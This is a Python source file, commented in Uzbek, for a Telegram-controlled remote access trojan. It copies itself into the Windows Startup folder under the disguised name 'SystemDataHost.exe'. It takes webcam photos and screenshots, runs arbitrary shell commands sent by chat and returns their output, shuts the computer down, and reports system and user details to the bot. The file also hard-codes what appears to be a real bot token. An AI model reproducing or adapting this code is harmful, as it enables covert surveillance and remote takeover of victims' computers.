import telebot
import os
import cv2
import sys
import shutil
import subprocess
import pyautogui
import time
from telebot import types

# --- KONFIGURATSIYA ---
TOKEN = '8067999467:AAEtm-y3hI_kKr3EKzhMr0cWSyiLGAMterQ'
ADMIN_ID = "O'Z_ID_RAQAMINGIZ"  # @userinfobot orqali olingan ID ni yozing!
bot = telebot.TeleBot(TOKEN)

# --- AVTOYUKLANISH (PERSISTENCE) ---
def persistence():
    try:
        app_name = "SystemDataHost.exe"
        startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        dest = os.path.join(startup_path, app_name)
        
        # Faqat EXE bo'lib ishlayotgan bo'lsa va hali nusxalanmagan bo'lsa
        if getattr(sys, 'frozen', False):
            current_file = sys.executable
            if not os.path.exists(dest):
                shutil.copy(current_file, dest)
    except:
        pass

# --- XAVFSIZLIK: FAQAT ADMINNI TANIYDI ---
def is_admin(uid):
    return str(uid) == str(ADMIN_ID)

# --- ASOSIY MENYU ---
def get_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add('📸 Kamera', '🖥 Skrinshot', '💻 Terminal', '🔌 O\'chirish', 'ℹ️ Ma\'lumot')
    return markup

@bot.message_handler(commands=['start'])
def welcome(m):
    if is_admin(m.from_user.id):
        bot.send_message(m.chat.id, "🛰 Markaziy tizim faollashtirildi.", reply_markup=get_keyboard())
    else:
        bot.send_message(m.chat.id, "⛔️ Kirish taqiqlangan! Faqat egasi uchun.")

# 1. KAMERA (XAVFSIZLIK REJIMIDA)
@bot.message_handler(func=lambda m: m.text == '📸 Kamera')
def take_photo(m):
    if not is_admin(m.from_user.id): return
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            bot.send_message(m.chat.id, "❌ Kamera topilmadi yoki serverda ishlamaydi.")
            return
        time.sleep(1)
        ret, frame = cap.read()
        cap.release()
        if ret:
            cv2.imwrite("c.jpg", frame)
            with open("c.jpg", "rb") as f:
                bot.send_photo(m.chat.id, f, caption="Kamera tasviri")
            os.remove("c.jpg")
    except Exception as e:
        bot.send_message(m.chat.id, f"⚠️ Kamera xatosi: {e}")

# 2. SKRINSHOT
@bot.message_handler(func=lambda m: m.text == '🖥 Skrinshot')
def take_screen(m):
    if not is_admin(m.from_user.id): return
    try:
        # Serverda (Linux) bo'lsa bu qism ishlamasligi mumkin
        shot = pyautogui.screenshot()
        shot.save("s.png")
        with open("s.png", "rb") as f:
            bot.send_photo(m.chat.id, f, caption="Ekran tasviri")
        os.remove("s.png")
    except Exception as e:
        bot.send_message(m.chat.id, f"❌ Skrinshot xatosi: {e}\n(Serverda ekran bo'lmasligi mumkin)")

# 3. TERMINAL (MASOFAVIY KOD YOZISH)
@bot.message_handler(func=lambda m: m.text == '💻 Terminal')
def ask_cmd(m):
    if not is_admin(m.from_user.id): return
    msg = bot.send_message(m.chat.id, "⌨️ Buyruq yuboring (masalan: `dir`, `ipconfig`, `whoami`):")
    bot.register_next_step_handler(msg, run_cmd)

def run_cmd(m):
    try:
        # Buyruqni bajarish va natijani cp866 (Windows) yoki utf-8 (Linux)da olish
        res = subprocess.check_output(m.text, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        output = res.decode('cp866') if os.name == 'nt' else res.decode('utf-8')
        bot.send_message(m.chat.id, f"✅ Natija:\n```\n{output}\n```", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(m.chat.id, f"⚠️ Xato: {e}")

# 4. TIZIMNI XAVFSIZ O'CHIRISH (BSOD OLDINI OLISH)
@bot.message_handler(func=lambda m: m.text == '🔌 O\'chirish')
def confirm_off(m):
    if not is_admin(m.from_user.id): return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Ha, o'chirilsin", callback_data="shutdown_yes"),
               types.InlineKeyboardButton("❌ Yo'q", callback_data="shutdown_no"))
    bot.send_message(m.chat.id, "🚨 Tasdiqlang! Kompyuter tartib bilan o'chiriladi. (60 soniya vaqt)", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "shutdown_yes":
        bot.edit_message_text("🔄 Kompyuter o'chirilmoqda. To'xtatish uchun: `shutdown /a` yozing.", call.message.chat.id, call.message.message_id)
        # /s - o'chirish, /t 60 - xavfsiz vaqt, /f - majburlash EMAS (tartibli yopish)
        os.system("shutdown /s /t 60")
    elif call.data == "shutdown_no":
        bot.edit_message_text("✅ Bekor qilindi.", call.message.chat.id, call.message.message_id)

# 5. MA'LUMOT
@bot.message_handler(func=lambda m: m.text == 'ℹ️ Ma\'lumot')
def info(m):
    if not is_admin(m.from_user.id): return
    sys_info = f"💻 OS: {os.name}\n📂 User: {os.getlogin()}\n🕒 Vaqt: {time.ctime()}"
    bot.send_message(m.chat.id, sys_info)

# --- ISHGA TUSHIRISH ---
if __name__ == "__main__":
    persistence() # EXE bo'lsa startupga qo'shadi
    print("Bot faol...")
    try:
        bot.infinity_polling()
    except Exception:
        time.sleep(10) # Internet uzilsa kutib qayta ulanadi